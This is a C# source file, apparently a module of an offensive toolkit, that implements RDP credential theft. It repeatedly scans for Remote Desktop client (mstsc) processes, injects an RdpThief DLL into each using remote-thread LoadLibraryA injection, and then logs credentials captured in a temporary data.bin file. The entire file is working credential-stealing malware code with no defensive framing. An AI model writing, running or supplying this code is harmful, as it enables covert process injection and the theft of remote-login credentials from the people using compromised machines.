using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;

using Redknife.APIs;

namespace Redknife.Modules
{
    public class RDPThief : BaseModule
    {

        public override void Run()
        {
            HashSet<int> injectedProcesses = new HashSet<int>();

            // Assume payload is the path to the RdpThief.dll file
            LogUtil.Info("Assuming payload contains path to RdpThief.dll on the local system (this should already exist on target system)");

            LogUtil.Info("Looping infinitely, checking for mstsc processes...");

            string outPath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "data.bin");
            DateTime outPathLastModified = DateTime.Now;

            while (true)
            {
                // Check for any new mstsc processes...
                Process[] mstscProc = Process.GetProcessesByName("mstsc");
                if (mstscProc.Length > 0)
                { 
                    foreach(Process proc in mstscProc)
                    {
                        // Check if we've already attempted to inject into process
                        if (injectedProcesses.Contains(proc.Id))
                        {
                            break;
                        }
                        LogUtil.Info("Injecting into mstsc process ID: {0}", 0, proc.Id);
                        injectedProcesses.Add(proc.Id);

                        IntPtr hProcess = Kernel32.OpenProcess(0x001F0FFF, false, proc.Id);

                        LogUtil.Debug("Allocating memory for buffer...", 1);
                        IntPtr addr = Kernel32.VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

                        IntPtr outSize;
                        LogUtil.Debug("Writing DLL path to memory...", 1);
                        Kernel32.WriteProcessMemory(hProcess, addr, this.Payload, this.Payload.Length, out outSize);

                        // Load the RdpThief library specified by payload path
                        LogUtil.Debug("Getting proc address of LoadLibraryA...", 1);
                        IntPtr loadLib = Kernel32.GetProcAddress(Kernel32.GetModuleHandle("kernel32.dll"), "LoadLibraryA");

                        LogUtil.Debug("Creating remote thread for RDPThief in mstsc process ID: {0}...", 1, proc.Id);
                        IntPtr hThread = Kernel32.CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);

                        LogUtil.Info("Check for credentials in file: {0}\\data.bin", 1, System.IO.Path.GetTempPath());
                    }
                }

                // Check for any updates to output file
                if (File.Exists(outPath) && File.GetLastWriteTime(outPath).Ticks > outPathLastModified.Ticks)
                {
                    outPathLastModified = File.GetLastWriteTime(outPath);
                    LogUtil.Info("Updated output from file ({0}):\n{1}", 1, outPath, File.ReadAllText(outPath));
                }

                Thread.Sleep(1000);
            }
        }

    }
}
